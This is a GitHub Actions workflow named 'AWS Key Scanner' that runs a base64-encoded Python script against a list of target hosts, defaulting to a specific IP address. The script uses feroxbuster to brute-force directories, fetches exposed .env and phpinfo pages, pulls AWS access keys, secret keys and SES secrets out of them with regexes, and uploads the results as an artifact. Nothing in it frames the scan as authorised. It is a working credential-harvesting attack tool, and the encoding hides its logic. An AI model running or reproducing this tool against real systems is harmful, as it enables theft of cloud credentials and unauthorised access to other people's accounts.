name: AWS Key Scanner

on:
  workflow_dispatch:
    inputs:
      targets:
        description: "Liste des IP/domaines (séparés par des virgules)"
        required: true
        default: "98.92.70.139"
      wordlist_url:
        description: "URL de la wordlist"
        required: false
        default: "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt"

jobs:
  scan:
    runs-on: ubuntu-latest
    
    steps:
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: "3.10"
      
      - name: Install feroxbuster
        run: |
          wget https://github.com/epi052/feroxbuster/releases/latest/download/x86_64-linux-feroxbuster.tar.gz
          tar -xzf x86_64-linux-feroxbuster.tar.gz
          chmod +x feroxbuster
          sudo mv feroxbuster /usr/local/bin/
      
      - name: Download wordlist
        run: |
          wget -O wordlist.txt "${{ github.event.inputs.wordlist_url }}"
      
      - name: Create scanner script
        run: |
          echo "aW1wb3J0IGpzb24KaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHVybGxpYi5yZXF1ZXN0CmltcG9ydCB1cmxsaWIuZXJyb3IKaW1wb3J0IHNzbAppbXBvcnQgb3MKaW1wb3J0IHJlCmltcG9ydCBzeXMKCnNzbF9jdHggPSBzc2wuX2NyZWF0ZV91bnZlcmlmaWVkX2NvbnRleHQoKQphd3NfYWNjZXNzX2tleV9yZWdleCA9IHJlLmNvbXBpbGUocidBS0lBW0EwLVo5XXsxNn0nKQpzZWNyZXRfb3Jfc2VzX3JlZ2V4ID0gcmUuY29tcGlsZShyJ1tcdysvPV17NDAsNDR9JykKCmRlZiBleHRyYWN0X2tleXNfZnJvbV9lbnYoY29udGVudCk6CiAgICBsaW5lcyA9IGNvbnRlbnQuc3BsaXRsaW5lcygpCiAgICByZXN1bHRzID0gW10KICAgIGZvciBpZHgsIGxpbmUgaW4gZW51bWVyYXRlKGxpbmVzKToKICAgICAgICBpZiBhd3NfYWNjZXNzX2tleV9yZWdleC5zZWFyY2gobGluZSk6CiAgICAgICAgICAgIHN0YXJ0ID0gbWF4KDAsIGlkeCAtIDMpCiAgICAgICAgICAgIGVuZCA9IG1pbihsZW4obGluZXMpLCBpZHggKyA0KQogICAgICAgICAgICBjb250ZXh0X2xpbmVzID0gbGluZXNbc3RhcnQ6ZW5kXQogICAgICAgICAgICBhY2Nlc3Nfa2V5ID0gYXdzX2FjY2Vzc19rZXlfcmVnZXguc2VhcmNoKGxpbmUpLmdyb3VwKCkgaWYgYXdzX2FjY2Vzc19rZXlfcmVnZXguc2VhcmNoKGxpbmUpIGVsc2UgTm9uZQogICAgICAgICAgICBzZWNyZXRfa2V5ID0gTm9uZQogICAgICAgICAgICBzZXNfc2VjcmV0ID0gTm9uZQogICAgICAgICAgICBmb3IgY29udGV4dF9saW5lIGluIGNvbnRleHRfbGluZXM6CiAgICAgICAgICAgICAgICBpZiAnPScgaW4gY29udGV4dF9saW5lOgogICAgICAgICAgICAgICAgICAgIF8sIHZhbHVlID0gY29udGV4dF9saW5lLnNwbGl0KCc9JywgMSkKICAgICAgICAgICAgICAgICAgICB2YWx1ZSA9IHZhbHVlLnN0cmlwKCkKICAgICAgICAgICAgICAgICAgICBpZiBsZW4odmFsdWUpID09IDQwOgogICAgICAgICAgICAgICAgICAgICAgICBzZWNyZXRfa2V5ID0gdmFsdWUKICAgICAgICAgICAgICAgICAgICBlbGlmIGxlbih2YWx1ZSkgPT0gNDQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHNlc19zZWNyZXQgPSB2YWx1ZQogICAgICAgICAgICByZXN1bHRzLmFwcGVuZCh7ImFjY2Vzc19rZXkiOiBhY2Nlc3Nfa2V5LCAic2VjcmV0X2tleSI6IHNlY3JldF9rZXksICJzZXNfc2VjcmV0Ijogc2VzX3NlY3JldH0pCiAgICByZXR1cm4gcmVzdWx0cwoKZGVmIGV4dHJhY3Rfa2V5c19mcm9tX2luZm9fcGhwKGNvbnRlbnQpOgogICAgbGluZXMgPSBjb250ZW50LnNwbGl0bGluZXMoKQogICAgcmVzdWx0cyA9IFtdCiAgICBmb3IgaWR4LCBsaW5lIGluIGVudW1lcmF0ZShsaW5lcyk6CiAgICAgICAgaWYgYXdzX2FjY2Vzc19rZXlfcmVnZXguc2VhcmNoKGxpbmUpOgogICAgICAgICAgICBtID0gYXdzX2FjY2Vzc19rZXlfcmVnZXguc2VhcmNoKGxpbmUpCiAgICAgICAgICAgIGFjY2Vzc19rZXkgPSBtLmdyb3VwKCkgaWYgbSBlbHNlIE5vbmUKICAgICAgICAgICAgc3RhcnQgPSBtYXgoMCwgaWR4IC0gMykKICAgICAgICAgICAgZW5kID0gbWluKGxlbihsaW5lcyksIGlkeCArIDQpCiAgICAgICAgICAgIGNvbnRleHRfbGluZXMgPSBsaW5lc1tzdGFydDplbmRdCiAgICAgICAgICAgIHNlY3JldF9rZXkgPSBOb25lCiAgICAgICAgICAgIHNlc19zZWNyZXQgPSBOb25lCiAgICAgICAgICAgIGZvciBjdHggaW4gY29udGV4dF9saW5lczoKICAgICAgICAgICAgICAgIGZvciBjYW5kIGluIHNlY3JldF9vcl9zZXNfcmVnZXguZmluZGFsbChjdHgpOgogICAgICAgICAgICAgICAgICAgIGlmIGxlbihjYW5kKSA9PSA0MCBhbmQgc2VjcmV0X2tleSBpcyBOb25lOgogICAgICAgICAgICAgICAgICAgICAgICBzZWNyZXRfa2V5ID0gY2FuZAogICAgICAgICAgICAgICAgICAgIGVsaWYgbGVuKGNhbmQpID09IDQ0IGFuZCBzZXNfc2VjcmV0IGlzIE5vbmU6CiAgICAgICAgICAgICAgICAgICAgICAgIHNlc19zZWNyZXQgPSBjYW5kCiAgICAgICAgICAgIHJlc3VsdHMuYXBwZW5kKHsiYWNjZXNzX2tleSI6IGFjY2Vzc19rZXksICJzZWNyZXRfa2V5Ijogc2VjcmV0X2tleSwgInNlc19zZWNyZXQiOiBzZXNfc2VjcmV0fSkKICAgIHJldHVybiByZXN1bHRzCgpkZWYgc2Nhbl90YXJnZXQodGFyZ2V0LCB3b3JkbGlzdCk6CiAgICB0YXJnZXQgPSAiaHR0cDovLyIgKyB0YXJnZXQKICAgIGNtZCA9IFsiZmVyb3hidXN0ZXIiLCAiLXUiLCB0YXJnZXQsICItdyIsIHdvcmRsaXN0LCAiLS1zaWxlbnQiLCAiLXQiLCAiMTAiLCAiLWQiLCAiMiJdCiAgICBwcmludChmIlJ1bm5pbmc6IHsnICcuam9pbihjbWQpfSIpCiAgICAKICAgIHByb2MgPSBzdWJwcm9jZXNzLlBvcGVuKGNtZCwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSwgdGV4dD1UcnVlKQogICAgc3Rkb3V0X2RhdGEsIHN0ZGVycl9kYXRhID0gcHJvYy5jb21tdW5pY2F0ZSgpCiAgICAKICAgIGlmIHByb2MucmV0dXJuY29kZSAhPSAwOgogICAgICAgIHByaW50KGYiZmVyb3hidXN0ZXIgZmFpbGVkOiB7c3RkZXJyX2RhdGF9IikKICAgICAgICByZXR1cm4gW10KICAgIAogICAgZGlycyA9IFtdCiAgICBmb3IgbGluZSBpbiBzdGRvdXRfZGF0YS5zcGxpdGxpbmVzKCk6CiAgICAgICAgbGluZSA9IGxpbmUuc3RyaXAoKQogICAgICAgIGlmIGxpbmU6CiAgICAgICAgICAgIHBhcnRzID0gbGluZS5zcGxpdCgpCiAgICAgICAgICAgIGlmIHBhcnRzOgogICAgICAgICAgICAgICAgdXJsID0gcGFydHNbLTFdCiAgICAgICAgICAgICAgICBkaXJzLmFwcGVuZCh1cmwpCiAgICAKICAgIHJldHVybiBkaXJzCgpkZWYgY2hlY2tfZW5kcG9pbnRzKGRpcnMpOgogICAgZmluZGluZ3MgPSBbXQogICAgZm9yIGRpcl91cmwgaW4gZGlyczoKICAgICAgICBlbnZfdXJsID0gZGlyX3VybC5yc3RyaXAoIi8iKSArICIvLmVudiIKICAgICAgICBwcmludChmIkNoZWNraW5nOiB7ZW52X3VybH0iKQogICAgICAgIHRyeToKICAgICAgICAgICAgcmVxID0gdXJsbGliLnJlcXVlc3QuUmVxdWVzdChlbnZfdXJsLCBtZXRob2Q9IkdFVCIpCiAgICAgICAgICAgIHdpdGggdXJsbGliLnJlcXVlc3QudXJsb3BlbihyZXEsIGNvbnRleHQ9c3NsX2N0eCwgdGltZW91dD0xNSkgYXMgcmVzcDoKICAgICAgICAgICAgICAgIGlmIHJlc3AuZ2V0Y29kZSgpID09IDIwMDoKICAgICAgICAgICAgICAgICAgICBjb250ZW50ID0gcmVzcC5yZWFkKCkuZGVjb2RlKGVycm9ycz0naWdub3JlJykKICAgICAgICAgICAgICAgICAgICBpZiBhd3NfYWNjZXNzX2tleV9yZWdleC5zZWFyY2goY29udGVudCk6CiAgICAgICAgICAgICAgICAgICAgICAgIGZvdW5kX2tleXMgPSBleHRyYWN0X2tleXNfZnJvbV9lbnYoY29udGVudCkKICAgICAgICAgICAgICAgICAgICAgICAgZmluZGluZ3MuYXBwZW5kKHsidXJsIjogZW52X3VybCwgInR5cGUiOiAiLmVudiIsICJrZXlzIjogZm91bmRfa2V5c30pCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgcGFzcwogICAgICAgIAogICAgICAgIGZvciBpbmZvX25hbWUgaW4gWyJpbmZvLnBocCIsICJwaHBpbmZvLnBocCJdOgogICAgICAgICAgICBpbmZvX3VybCA9IGRpcl91cmwucnN0cmlwKCIvIikgKyAiLyIgKyBpbmZvX25hbWUKICAgICAgICAgICAgcHJpbnQoZiJDaGVja2luZzoge2luZm9fdXJsfSIpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHJlcV9pbmZvID0gdXJsbGliLnJlcXVlc3QuUmVxdWVzdChpbmZvX3VybCwgbWV0aG9kPSJHRVQiKQogICAgICAgICAgICAgICAgd2l0aCB1cmxsaWIucmVxdWVzdC51cmxvcGVuKHJlcV9pbmZvLCBjb250ZXh0PXNzbF9jdHgsIHRpbWVvdXQ9MTUpIGFzIHJlc3A6CiAgICAgICAgICAgICAgICAgICAgaWYgcmVzcC5nZXRjb2RlKCkgPT0gMjAwOgogICAgICAgICAgICAgICAgICAgICAgICBpbmZvX2NvbnRlbnQgPSByZXNwLnJlYWQoKS5kZWNvZGUoZXJyb3JzPSdpZ25vcmUnKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBhd3NfYWNjZXNzX2tleV9yZWdleC5zZWFyY2goaW5mb19jb250ZW50KToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvdW5kX2tleXNfaW5mbyA9IGV4dHJhY3Rfa2V5c19mcm9tX2luZm9fcGhwKGluZm9fY29udGVudCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbmRpbmdzLmFwcGVuZCh7InVybCI6IGluZm9fdXJsLCAidHlwZSI6IGluZm9fbmFtZSwgImtleXMiOiBmb3VuZF9rZXlzX2luZm99KQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgcGFzcwogICAgCiAgICByZXR1cm4gZmluZGluZ3MKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICB0YXJnZXRzID0gc3lzLmFyZ3ZbMV0uc3BsaXQoIiwiKQogICAgd29yZGxpc3QgPSBzeXMuYXJndlsyXQogICAgCiAgICBhbGxfZmluZGluZ3MgPSBbXQogICAgZm9yIHRhcmdldCBpbiB0YXJnZXRzOgogICAgICAgIHRhcmdldCA9IHRhcmdldC5zdHJpcCgpCiAgICAgICAgcHJpbnQoZiJcbj09PSBTY2FubmluZyB7dGFyZ2V0fSA9PT0iKQogICAgICAgIGRpcnMgPSBzY2FuX3RhcmdldCh0YXJnZXQsIHdvcmRsaXN0KQogICAgICAgIHByaW50KGYiRm91bmQge2xlbihkaXJzKX0gZGlyZWN0b3JpZXMiKQogICAgICAgIGZpbmRpbmdzID0gY2hlY2tfZW5kcG9pbnRzKGRpcnMpCiAgICAgICAgYWxsX2ZpbmRpbmdzLmV4dGVuZChmaW5kaW5ncykKICAgIAogICAgcHJpbnQoZiJcbj09PSBSZXN1bHRzID09PSIpCiAgICBwcmludChqc29uLmR1bXBzKGFsbF9maW5kaW5ncywgaW5kZW50PTIpKQogICAgCiAgICB3aXRoIG9wZW4oInJlc3VsdHMuanNvbiIsICJ3IikgYXMgZjoKICAgICAgICBqc29uLmR1bXAoYWxsX2ZpbmRpbmdzLCBmLCBpbmRlbnQ9MikK" | base64 -d > scanner.py
      
      - name: Run scanner
        run: |
          python scanner.py "${{ github.event.inputs.targets }}" wordlist.txt
      
      - name: Upload results
        uses: actions/upload-artifact@v3
        if: always()
        with:
          name: scan-results
          path: results.json
      
      - name: Display results
        if: always()
        run: |
          if [ -f results.json ]; then
            echo "=== Scan Results ==="
            cat results.json
          fi
